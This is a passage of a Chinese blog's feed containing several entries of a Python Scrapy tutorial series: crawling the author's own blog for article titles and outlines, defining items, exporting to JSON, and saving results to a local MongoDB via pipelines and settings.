      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>【Python Scrapy 爬虫框架】 5、利用 pipelines 和 settings 将爬取数据存储到 MongoDB</title>
    <link href="https://www.teamssix.com/year/191226-151702.html"/>
    <id>https://www.teamssix.com/year/191226-151702.html</id>
    <published>2019-12-26T07:17:02.000Z</published>
    <updated>2019-12-26T08:24:37.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前文中讲到了将爬取的数据导出到文件中，接下来就在前文的代码基础之上，将数据导出到 MongoDB中。</p><h1 id="0x01-配置-pipelines-py"><a href="#0x01-配置-pipelines-py" class="headerlink" title="0x01 配置 pipelines.py"></a>0x01 配置 pipelines.py</h1><p>首先来到 pipelines.py 文件下，在这里写入连接操作数据库的一些功能。</p><p>将连接操作 mongo 所需要的包导入进来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br></pre></td></tr></table></figure><a id="more"></a><p>接下来定义一些参数，注意下面的函数都是在 TeamssixPipeline 类下的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_crawler</span><span class="params">(cls, crawler)</span>:</span></span><br><span class="line">    cls.DB_URL = crawler.settings.get(<span class="string">'MONGO_DB_URI'</span>)</span><br><span class="line">    cls.DB_NAME = crawler.settings.get(<span class="string">'MONGO_DB_NAME'</span>)</span><br><span class="line">    <span class="keyword">return</span> cls()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_spider</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">    self.client = pymongo.MongoClient(self.DB_URL)</span><br><span class="line">    self.db = self.client[self.DB_NAME]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_spider</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">    self.client.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line">    collection = self.db[spider.name]</span><br><span class="line">    collection.insert_one(dict(item))</span><br><span class="line">    <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><h1 id="0x02-配置-settings-py"><a href="#0x02-配置-settings-py" class="headerlink" title="0x02 配置 settings.py"></a>0x02 配置 settings.py</h1><p>ITEM_PIPELINES 是settings.py 文件自带的，把注释符号删掉就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">'teamssix.pipelines.TeamssixPipeline'</span>: <span class="number">300</span>,  <span class="comment">#优先级，1-1000，数值越低优先级越高</span></span><br><span class="line">&#125;</span><br><span class="line">MONGO_DB_URI = <span class="string">'mongodb://localhost:27017'</span>  <span class="comment">#mongodb 的连接 url</span></span><br><span class="line">MONGO_DB_NAME = <span class="string">'blog'</span>  <span class="comment">#要连接的库</span></span><br></pre></td></tr></table></figure><h1 id="0x02-运行"><a href="#0x02-运行" class="headerlink" title="0x02 运行"></a>0x02 运行</h1><p>直接执行命令，不加参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl blogurl</span><br></pre></td></tr></table></figure><p>注意，如果原来 MongoDB 中没有我们要连接的库， MongoDB 会自己创建，就不需要自己创建了，所以还是蛮方便的，使用 Robo 3T 打开后，就能看到刚才存进的数据。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/scrapy12.png" alt></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a><br><a href="https://lemmo.xyz/post/Scrapy-To-MongoDB-By-Pipeline.html" target="_blank" rel="noopener">https://lemmo.xyz/post/Scrapy-To-MongoDB-By-Pipeline.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前文中讲到了将爬取的数据导出到文件中，接下来就在前文的代码基础之上，将数据导出到 MongoDB中。&lt;/p&gt;
&lt;h1 id=&quot;0x01-配置-pipelines-py&quot;&gt;&lt;a href=&quot;#0x01-配置-pipelines-py&quot; class=&quot;headerlink&quot; title=&quot;0x01 配置 pipelines.py&quot;&gt;&lt;/a&gt;0x01 配置 pipelines.py&lt;/h1&gt;&lt;p&gt;首先来到 pipelines.py 文件下，在这里写入连接操作数据库的一些功能。&lt;/p&gt;
&lt;p&gt;将连接操作 mongo 所需要的包导入进来&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; pymongo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>【Python Scrapy 爬虫框架】 4、数据项介绍和导出文件</title>
    <link href="https://www.teamssix.com/year/191226-151659.html"/>
    <id>https://www.teamssix.com/year/191226-151659.html</id>
    <published>2019-12-26T07:16:59.000Z</published>
    <updated>2019-12-26T08:24:39.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>通过上文的内容，已经把博客文章的标题及目录爬取下来了，接下来为了方便数据的保存，我们可以把这些文章的标题及目录给包装成一个数据项，也就是 items。</p><h1 id="0x01-配置-item"><a href="#0x01-配置-item" class="headerlink" title="0x01 配置 item"></a>0x01 配置 item</h1><p>先来到 items.py 文件下，对标题及目录的信息进行包装，为了对这些信息进行区别，还需要有一个 id，所以代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TeamssixItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    _id = scrapy.Field()</span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    list = scrapy.Field()</span><br></pre></td></tr></table></figure><a id="more"></a><p>编辑好 items.py 文件后，来到 teamssix_blog_spider.py 先把刚才编辑的内容引用进来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> teamssix.items <span class="keyword">import</span> TeamssixItem</span><br></pre></td></tr></table></figure><p>接着创建一个 item ，并抛出 item ，这时这个 item 就会进入到 item pipelines 中处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">item = TeamssixItem(_id = response.url,title = title,list = list)</span><br><span class="line"><span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><h1 id="0x02-运行"><a href="#0x02-运行" class="headerlink" title="0x02 运行"></a>0x02 运行</h1><p>程序中包含 item 的好处就在于可以直接把运行结果输出到文件中，直接 -o 指定导出文件名，scrapy 支持导出 json 、jsonlines 、jl 、csv 、xml 、marshal 、pickle 这几种格式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl blogurl -o result.json</span><br></pre></td></tr></table></figure><p>另外如果发现导出文件乱码，只需要在 settings.py 文件中添加下面一行代码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FEED_EXPORT_ENCODING = <span class="string">"gb18030"</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~# scrapy crawl blogurl -o result.json</span><br><span class="line">~# cat result2.json</span><br><span class="line">[</span><br><span class="line">&#123;&quot;_id&quot;: &quot;https://www.teamssix.com/year/191224-093319.html&quot;, &quot;title&quot;: &quot;【Python Scrapy 爬虫框架】 2、利用 Scrapy 爬取我的博客文章标题链接&quot;, &quot;list&quot;: [&quot;0x00 新建项目&quot;, &quot;0x01 创建一个爬虫&quot;, &quot;0x02</span><br><span class="line"> 运行爬虫&quot;, &quot;0x03 爬取内容解析&quot;]&#125;,</span><br><span class="line">&#123;&quot;_id&quot;: &quot;https://www.teamssix.com/year/191127-201447.html&quot;, &quot;title&quot;: &quot;【漏洞笔记】Robots.txt站点文件&quot;, &quot;list&quot;: [&quot;0x00 概述&quot;, &quot;0x01 漏洞描述&quot;, &quot;0x02 漏洞危害&quot;, &quot;0x03 修复建议&quot;]&#125;,</span><br><span class="line">……省略……</span><br></pre></td></tr></table></figure><p>可以很明显的感受到使用 scrapy 可以很方便的将数据导出到文件中，下一篇文章将介绍如何导出到 MongoDB数据库中。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;通过上文的内容，已经把博客文章的标题及目录爬取下来了，接下来为了方便数据的保存，我们可以把这些文章的标题及目录给包装成一个数据项，也就是 items。&lt;/p&gt;
&lt;h1 id=&quot;0x01-配置-item&quot;&gt;&lt;a href=&quot;#0x01-配置-item&quot; class=&quot;headerlink&quot; title=&quot;0x01 配置 item&quot;&gt;&lt;/a&gt;0x01 配置 item&lt;/h1&gt;&lt;p&gt;先来到 items.py 文件下，对标题及目录的信息进行包装，为了对这些信息进行区别，还需要有一个 id，所以代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;TeamssixItem&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(scrapy.Item)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _id = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    title = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    list = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>【Python Scrapy 爬虫框架】 3、利用 Scrapy 爬取博客文章详细信息</title>
    <link href="https://www.teamssix.com/year/191226-151652.html"/>
    <id>https://www.teamssix.com/year/191226-151652.html</id>
    <published>2019-12-26T07:16:52.000Z</published>
    <updated>2019-12-26T08:24:40.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h1><p>在之前的文章中，会发现如果直接使用爬取命令，终端会回显很多调试信息，这样输出的内容就会显得很乱，所以就可以使用下面的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl blogurl  -s LOG_FILE=all.log</span><br></pre></td></tr></table></figure><a id="more"></a><p>也就是在原来的基础上加上一个 -s 参数，这样调试信息就会保存到参数指定的文件中，不过也可以在 class 下添加下面的代码，这样只会显示调试出现错误的信息，所以这种方式就不用加 -s 了，至于选择哪一个，就需要​视情况而定。​</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">custom_settings = &#123;&apos;LOG_LEVEL&apos;:&apos;ERROR&apos;&#125;</span><br></pre></td></tr></table></figure><h1 id="0x01-编写子页面爬取代码"><a href="#0x01-编写子页面爬取代码" class="headerlink" title="0x01 编写子页面爬取代码"></a>0x01 编写子页面爬取代码</h1><p>先来看一行关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">yield</span> scrapy.Request(url,callback=self.sub_article)</span><br></pre></td></tr></table></figure><p>上面这行代码中，使用 yield 返回利用 scrapy 请求 url 所获得的数据，并将数据通过 callback 传递到 sub_article 函数中。</p><p>其实对于 yield 和 return 都可以返回数据，但是利用 yield 返回数据后，还可以继续运行下面的代码，而使用 return 后，接下来的代码就不会再运行了，在 scrapy 中，如果使用 return 返回数据再用 list 存储数据，会造成不少的内存消耗，而使用 yield 则可以减少这些不必要的内存浪费。</p><p>所以接下来在 sub_article 函数中写上我们爬取子页面的代码即可，这里就爬取每个文章的标题和目录作为示例了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_article</span><span class="params">(self,response)</span>:</span></span><br><span class="line">   soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">   print(<span class="string">'\n'</span>,soup.select(<span class="string">'.title'</span>)[<span class="number">0</span>].text)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.toc-text'</span>):</span><br><span class="line">      print(<span class="string">'\t'</span>,i.text)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">~# scrapy crawl blogurl  -s LOG_FILE=all.log</span><br><span class="line">【漏洞笔记】Robots.txt站点文件</span><br><span class="line">         0x00 概述</span><br><span class="line">         0x01 漏洞描述</span><br><span class="line">         0x02 漏洞危害</span><br><span class="line">         0x03 修复建议</span><br><span class="line">【经验总结】常见的HTTP方法</span><br><span class="line">         0x00 概述</span><br><span class="line">         0x01 GET</span><br><span class="line">         0x02 HEAD</span><br><span class="line">         0x03 POST</span><br><span class="line">         0x04 PUT</span><br><span class="line">         0x05 DELETE</span><br><span class="line">         0x06 CONNECT</span><br><span class="line">         0x07 OPTIONS</span><br><span class="line">         0x08 TRACE</span><br><span class="line">         0x09 PATCH</span><br><span class="line">【漏洞笔记】Host头攻击</span><br><span class="line">         0x00 概述</span><br><span class="line">         0x01 漏洞描述</span><br><span class="line">         0x02 漏洞危害</span><br><span class="line">         0x03 修复建议</span><br><span class="line">【直播笔记】白帽子的成长之路</span><br><span class="line">【Python 学习笔记】 异步IO (asyncio) 协程</span><br><span class="line">         0x00 前言</span><br><span class="line">         0x01 基本用法</span><br><span class="line">……省略……</span><br></pre></td></tr></table></figure><h1 id="0x02-完整代码"><a href="#0x02-完整代码" class="headerlink" title="0x02 完整代码"></a>0x02 完整代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">   name = <span class="string">'blogurl'</span></span><br><span class="line">   start_urls = [<span class="string">'https://www.teamssix.com'</span>]</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,response)</span>:</span></span><br><span class="line">      soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">         url = <span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>])</span><br><span class="line">         <span class="keyword">yield</span> scrapy.Request(url,callback=self.sub_article)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">sub_article</span><span class="params">(self,response)</span>:</span></span><br><span class="line">      soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">      title = self.article_title(soup)</span><br><span class="line">      list = self.article_list(soup)</span><br><span class="line">      print(title)</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">         print(<span class="string">'\t'</span>,i)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">article_title</span><span class="params">(self,soup)</span>:</span></span><br><span class="line">      <span class="keyword">return</span> soup.select(<span class="string">'.title'</span>)[<span class="number">0</span>].text</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">article_list</span><span class="params">(self,soup)</span>:</span></span><br><span class="line">      list = []</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.toc-text'</span>):</span><br><span class="line">         list.append(i.text)</span><br><span class="line">      <span class="keyword">return</span> list</span><br></pre></td></tr></table></figure><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="https://blog.csdn.net/DEREK_D/article/details/84239813" target="_blank" rel="noopener">https://blog.csdn.net/DEREK_D/article/details/84239813</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h1&gt;&lt;p&gt;在之前的文章中，会发现如果直接使用爬取命令，终端会回显很多调试信息，这样输出的内容就会显得很乱，所以就可以使用下面的命令：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scrapy crawl blogurl  -s LOG_FILE=all.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>【Python Scrapy 爬虫框架】 2、利用 Scrapy 爬取我的博客文章标题链接</title>
    <link href="https://www.teamssix.com/year/191224-093319.html"/>
    <id>https://www.teamssix.com/year/191224-093319.html</id>
    <published>2019-12-24T01:33:19.000Z</published>
    <updated>2019-12-24T02:46:12.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-新建项目"><a href="#0x00-新建项目" class="headerlink" title="0x00 新建项目"></a>0x00 新建项目</h1><p>在终端中即可直接新建项目，这里我创建一个名称为 teamssix 的项目，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject teamssix</span><br></pre></td></tr></table></figure><p>命令运行后，会自动在当前目录下生成许多文件，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">teamssix</span><br><span class="line">    │  scrapy.cfg  #scrapy的配置文件</span><br><span class="line">    └─teamssix  #项目的Python模块，在这里写自己的代码</span><br><span class="line">        │  items.py  #项目定义文件</span><br><span class="line">        │  middlewares.py  #项目中间件文件</span><br><span class="line">        │  pipelines.py  #项目管道文件，用来处理数据的写入存储等操作</span><br><span class="line">        │  settings.py  #项目设置文件</span><br><span class="line">        │  __init__.py</span><br><span class="line">        ├─spiders  #在这里写爬虫代码</span><br><span class="line">        └─ __init__.py</span><br></pre></td></tr></table></figure><a id="more"></a><p>接下来使用 Pycharm 打开我们刚才新建的项目。</p><h1 id="0x01-创建一个爬虫"><a href="#0x01-创建一个爬虫" class="headerlink" title="0x01 创建一个爬虫"></a>0x01 创建一个爬虫</h1><p>首先，在 spiders 文件下 new 一个 python file，这里我新建了一个名为 teamssix_blog_spider 的 py 文件。</p><p>在新建的文件中写入自己的代码，这里我写的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogSpider</span><span class="params">(scrapy.Spider)</span>:</span>  <span class="comment">#创建 Spider 类</span></span><br><span class="line">   name = <span class="string">'blogurl'</span>，  <span class="comment">#爬虫名称，必填</span></span><br><span class="line">   start_urls = [<span class="string">'https://www.teamssix.com'</span>]  <span class="comment">#待爬取的 url ，必填</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,response)</span>:</span>  <span class="comment">#定义 parse 函数，以解析爬到的东西</span></span><br><span class="line">      print(response.url)</span><br><span class="line">      print(response.text)</span><br></pre></td></tr></table></figure><h1 id="0x02-运行爬虫"><a href="#0x02-运行爬虫" class="headerlink" title="0x02 运行爬虫"></a>0x02 运行爬虫</h1><p>之后运行我们刚新建的 blogurl 项目，运行命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl blogurl</span><br></pre></td></tr></table></figure><p>之后输出结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2019-12-23 18:33:45 [scrapy.utils.log] INFO: Scrapy 1.8.0 started (bot: teamssix)</span><br><span class="line">2019-12-23 18:33:45 [scrapy.utils.log] INFO: Versions: lxml 4.2.5.0, libxml2 2.9.8, cssselect 1.1.0, parsel 1.5.2, w3lib 1.21.0, Twisted 19.10.0, Python 3.7e&apos;</span><br><span class="line">……省略……</span><br><span class="line">https://www.teamssix.com</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;meta name=&quot;generator&quot; content=&quot;Hexo 3.8.0&quot;&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;&lt;meta name=&quot;vi                                      </span><br><span class="line">tent&gt;&lt;meta name=&quot;keywords&quot; content&gt;&lt;meta name=&quot;author&quot; content=&quot;Teams Six,undefined&quot;&gt;&lt;meta name=&quot;copyright&quot; content=&quot;Teams Six&quot;&gt;&lt;title&gt;【Teams Six】&lt;/title&gt;&lt;link rel=&quot;styles                                      </span><br><span class="line">css&quot;&gt;&lt;link rel=&quot;icon&quot; href=&quot;/favicon.ico&quot;&gt;&lt;!-- script(src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot;)--&gt;&lt;script src=&quot;/js/mathjax/mathjax</span><br><span class="line">    tex2jax: &#123;inlineMath: [[&apos;$&apos;, &apos;$&apos;], [&apos;\\(&apos;, &apos;\\)&apos;]]&#125;</span><br><span class="line">&#125;);</span><br><span 